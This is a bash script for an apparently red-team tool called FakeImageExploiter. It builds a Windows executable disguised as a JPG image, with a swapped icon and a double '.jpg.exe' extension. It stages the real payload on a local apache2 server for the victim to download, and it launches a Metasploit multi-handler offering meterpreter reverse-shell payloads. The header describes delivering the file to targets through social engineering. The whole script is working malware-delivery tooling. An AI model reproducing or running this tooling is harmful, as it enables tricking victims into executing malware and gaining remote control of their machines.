#!/bin/bash


##
# FakeImageExploiter v1.1 - image.jpg.exe
# Version: v1.1 (Alpha)
# Author: pedro ubuntu [ r00t-3xp10it ]
# CodeName: troia_revisited
# Distros Supported : Linux Ubuntu, Kali, Mint, Parrot OS
#
#
# Description:
#   This module takes one existing image.jpg and one payload.exe (input by user) and
#   builds a new payload (evil.jpg.exe) that if executed it will trigger the download
#   of the 2 previous files stored into apache2 webserver (image.jpg + payload.exe).
#   This module also changes the payload Icon to match the input image.jpg Then uses
#   'hides known file extensions' to hidde the .exe extension (final: evil.jpg.exe) ..
#
# Exploitation:
#   evil.jpg.exe final binary should be deliver to target using social enginnering
#   (apache2) As soon as the victim runs our executable, our picture will be downloaded
#   and opened in the default picture viewer, our malicious payload will be executed,
#   and we will get a meterpreter session.
#
#   'This tool will upload all files to apache2, and starts payload currespondent handler'
#
#
# Credits: https://null-byte.wonderhowto.com/how-to/hide-virus-inside-fake-picture-0168183
# Suspicious-Shell-Activity (SSA) RedTeam develop @2017
##

#
# TODO: build cleanner.rc to be called in meterpreter console (manual)
#        C:\\Users\\Public\\image.jpg + payload.exe
# TODO: if does not execute payload.exe then use r3lik .txt payload ..
#



#
# Tool variable declarations
#
VeR="1.1"
ArCh=`arch`
IPATH=`pwd`
HoME=`echo ~`
CnA="troia_revisited"
ApAc="/var/www/html"
DiStR0=`awk '{print $1}' /etc/issue` # grab distribution -  Ubuntu or Kali
InT3R=`netstat -r | grep "default" | awk {'print $8'}` # grab interface in use



#
# Config user system correct arch
#
if [ "$ArCh" = "i686" ]; then
dEd="x86"
arch="wine"
PgFi="Program Files"
ComP="i586-mingw32msvc-gcc"
else
dEd="x64"
arch="wine"
PgFi="Program Files"
ComP="i686-w64-mingw32-gcc"
fi



#
# Grab Ip address to config apache2 URL and evil agent
#
case $DiStR0 in
    Kali) IP=`ifconfig $InT3R | egrep -w "inet" | awk '{print $2}'`;;
    Debian) IP=`ifconfig $InT3R | egrep -w "inet" | awk '{print $2}'`;;
    Ubuntu) IP=`ifconfig $InT3R | egrep -w "inet" | cut -d ':' -f2 | cut -d 'B' -f1`;;
    Parrot) IP=`ifconfig $InT3R | egrep -w "inet" | cut -d ':' -f2 | cut -d 'B' -f1`;;
    BackBox) IP=`ifconfig $InT3R | egrep -w "inet" | cut -d ':' -f2 | cut -d 'B' -f1`;;
    elementary) IP=`ifconfig $InT3R | egrep -w "inet" | cut -d ':' -f2 | cut -d 'B' -f1`;;
    *) IP=`zenity --title="☠ Input your IP addr ☠" --text "example: 192.168.1.68" --entry --width 300`;;
  esac
clear



#
# check for dependencies Installed
# xterm, zenity, apache2, mingw32[64], ResourceHacker(wine)
#
echo "[⊶] Checking backend applications .."
sleep 1

# search for mingw32[64] intallation ..
apc=`which $ComP`
if [ "$?" != "0" ]; then
  FaIl="YES"
  echo "[x] mingw32 installation -> not found!"
  sleep 1
  echo "[x] This script requires mingw32 to work!"
  echo "[☆] Please wait: installing missing dependencies .."
  echo ""
  sudo apt get-install $ComP
  echo ""
else
  echo "[☆] mingw32 installation -> found! "
  sleep 1
fi

# search for wine intallation ..
apc=`which wine`
if [ "$?" != "0" ]; then
  FaIl="YES"
  echo "[x] Wine installation -> not found!"
  sleep 1
  echo "[x] This script requires wine to work!"
  echo "[☆] Please wait: installing missing dependencies .."
  echo ""
  sudo apt get-install wine
  echo ""
else
  echo "[☆] Wine installation    -> found!"
  sleep 1
fi

# search for xterm intallation ..
apc=`which xterm`
if [ "$?" != "0" ]; then
  FaIl="YES"
  echo "[x] Xterm installation -> not found!"
  sleep 1
  echo "[x] This script requires xterm to work!"
  echo "[☆] Please wait: installing missing dependencies .."
  echo ""
  sudo apt get-install xterm
  echo ""
else
  echo "[☆] Xterm installation   -> found!"
  sleep 1
fi

# search for zenity intallation ..
apc=`which zenity`
if [ "$?" != "0" ]; then
  FaIl="YES"
  echo "[x] Zenity installation -> not found!"
  sleep 1
  echo "[x] This script requires Zenity to work!"
  echo "[☆] Please wait: installing missing dependencies .."
  echo ""
  sudo apt get-install zenity
  echo ""
else
  echo "[☆] Zenity installation  -> found!"
  sleep 1
fi

# search for wine drive_c folder intallation ..
if [ -e "$HoME/.wine/drive_c/$PgFi" ]; then
  echo "[☆] Wine Program Files   -> found!"
  sleep 1
else
  FaIl="YES"
  echo "[x] Wine Program Files -> not found!"
  echo "[x] $HoME/.wine/drive_c/$PgFi"
  sleep 1
  echo "[x] Please wait, running winecfg!"
  winecfg > /dev/null 2>&1
  sleep 1
fi



#
# Restart tool after dependencies installs
#
sleep 2
if [ "$FaIl" = "YES" ]; then
  echo "[!] FakeImageExploiter needs to restart to finish installs .."
  sleep 2
  exit
fi



#
# BANNER DISPLAY
#
clear
cat << !

    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+---+
    |F|a|k|e|I|m|a|g|e|E|x|p|l|o|i|t|e|r|$VeR|
    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+---+

!
# chose to run or to abort framework execution ..
rUn=$(zenity --question --title="☠ FakeImageExploiter ☠" --text "Execute framework?" --width 270) > /dev/null 2>&1
  if [ "$?" -eq "0" ]; then
    service apache2 start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Start apache2 webserver" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
  else
    clear
    echo "codename::$CnA"
    echo "FakeImageExploiter©::v$VeR::SuspiciousShellActivity©::RedTeam::2017"
    sleep 1
    exit
  fi


#
# Questions to user (zenity)
#
# orginal payload full-path variable
UpL=$(zenity --title "☠ PAYLOAD TO BE TRANSFORMED ☠" --filename=$IPATH --file-selection --text "chose payload to be transformed") > /dev/null 2>&1
# orginal image.jpg full-path variable
JpG=$(zenity --title "☠ IMAGE TO BE USED (only .jpg) ☠" --filename=$IPATH --file-selection --text "chose image to use.") > /dev/null 2>&1
# icon to use in evil.jpg.exe (or image.jpg)
IcOn=$(zenity --list --title "☠ ICON REPLACEMENT  ☠" --text "Chose one icon from the list." --radiolist --column "Pick" --column "Option" TRUE "JPGblack.ico" FALSE "JPGwhite.ico" FALSE "JPGgreen.ico" FALSE "JPGblank.ico" FALSE "JPGorange.ico" FALSE "JPGfoto.ico" FALSE "Input your own image" --width 330 --height 280) > /dev/null 2>&1
# chose to input your own image insted of a icon
if [ "$IcOn" = "Input your own image" ]; then
  ImR=$(zenity --title "☠ IMAGE TO BE USED AS ICON ☠" --filename=$IPATH --file-selection --text "chose image to use") > /dev/null 2>&1
  PaTh="$ImR"
else
  PaTh="$IPATH/icons/$IcOn"
fi
# rename your exploiter (trigger)
MiP=$(zenity --title "☠ PAYLOAD FINAL NAME ☠" --text "example: screenshot" --entry --width 300) > /dev/null 2>&1




#
# build evil C binary
#
cd $IPATH/bin
echo "[☆] Configuring evil agent .."
sed "s|LhOsT|$IP|g" evil.c > evilcopy.c
sed -i "s|ScRee|$MiP.jpg|g" evilcopy.c



#
# Compiling agent using mingw32[64] (gcc)
# WARNING: this funtion only compiles 32bites payloads
# GCC    : i586-mingw32msvc-gcc OR i686-w64-mingw32-gcc
#
echo "[☆] Compiling agent using mingw32 .."
sleep 2
$ComP evilcopy.c -o trigger.exe -lws2_32 -mwindows
mv trigger.exe $IPATH/output/trigger.exe > /dev/null 2>&1
cd $IPATH



  #
  # check for resource hacker installation (wine)
  # WARNING: change this path to suite your needs ..
  #
  if [ -f "$HoME/.wine/drive_c/$PgFi/Resource Hacker/ResourceHacker.exe" ]; then
    echo "[☆] ResourceHacker.exe -> found!"
    sleep 1
    #
    # wine command to call resourcehacker and add a icon.ico to the 'trigger'
    #
    echo "[☆] Working on backdoor agent .."
    sleep 1
    echo ""
    $arch $HoME/.wine/drive_c/"$PgFi"/"Resource Hacker"/ResourceHacker.exe -open $UpL -save $IPATH/output/trigger.exe -action addskip -res $PaTh -mask ICONGROUP,MAINICON,
    echo ""
    echo "[☆] Change backdoor agent icons -> done .."
    sleep 1

  else

    echo "[x] ResourceHacker.exe -> not found!"
    sleep 1
cat << !

    Installing ResourceHacker under .wine directorys... 
    Version:windows7 Arch:$dEd Path:drive_c/$PgFi
    $HoME/.wine/drive_c/$PgFi/Resource Hacker/ResourceHacker.exe

!
    sleep 3
    xterm -T "FakeImageExploiter" -geometry 90x26 -e "$arch $IPATH/bin/reshacker_setup.exe && sleep 3"
    echo "[⊶] Please wait, restarting tool .."
    echo "[⊶] For proper ResourceHacker.exe Instalation!"
    sleep 2
    exit
  fi



    #
    # change extension
    #
    echo "[☆] Change backdoor agent extension .."
    mv $IPATH/output/trigger.exe  $IPATH/output/$MiP.jpg.exe > /dev/null 2>&1
    sleep 2



     #
     # port to apache2 (zip trigger.jpg.exe)
     #
     echo "[☠] port all files to apache2 webserver .."
     cp $UpL $ApAc/payload.exe > /dev/null 2>&1
     cp $JpG $ApAc/$MiP.jpg > /dev/null 2>&1
     sleep 2
     echo "[☠] creating archive -> $MiP.zip"
     zip $IPATH/output/$MiP.zip $IPATH/output/$MiP.jpg.exe > /dev/null 2>&1
     mv $IPATH/output/$MiP.zip $ApAc/$MiP.zip > /dev/null 2>&1
     sleep 2


  #
  # start metasploit handler?
  #
  rUn=$(zenity --question --title="☠ FakeImageExploiter ☠" --text "Execute a multi-handler?" --width 270) > /dev/null 2>&1
    if [ "$?" -eq "0" ]; then
      # input handler settings [metasploit]
      lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
      lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
      # input payload choise
      paylo=$(zenity --list --title "☠ FakeImageExploiter ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 350) > /dev/null 2>&1
      echo ""
      echo "    ATTACK VECTOR: http://$IP/$MiP.zip"
      echo ""
      xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"

    else

      #
      # port files to output folder
      # NO metasploit handler chosen by user ..
      #
      echo "[☆] All files ported to output folder .."
      echo "[☆] Store $MiP.jpg + payload.exe into our webserver .."
      echo "[☆] And deliver $MiP.jpg.exe to trigger payload download/execution .."
      cp $UpL $IPATH/output/payload.exe > /dev/null 2>&1
      cp $JpG $IPATH/output/$MiP.jpg > /dev/null 2>&1

    fi



  #
  # Clean things up ..
  #
  rm $ApAc/$MiP.jpg > /dev/null 2>&1
  rm $ApAc/$MiP.zip > /dev/null 2>&1
  rm $ApAc/payload.exe > /dev/null 2>&1
  rm $ApAc/$MiP.jpg.exe > /dev/null 2>&1
  rm $IPATH/bin/evilcopy.c > /dev/null 2>&1
  sleep 2

#
# Exit framework ..
#
echo ""
echo "codename::$CnA"
echo "FakeImageExploiter©::v$VeR::SuspiciousShellActivity©::RedTeam::2017"
sleep 1
service apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop apache2 webserver" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
exit



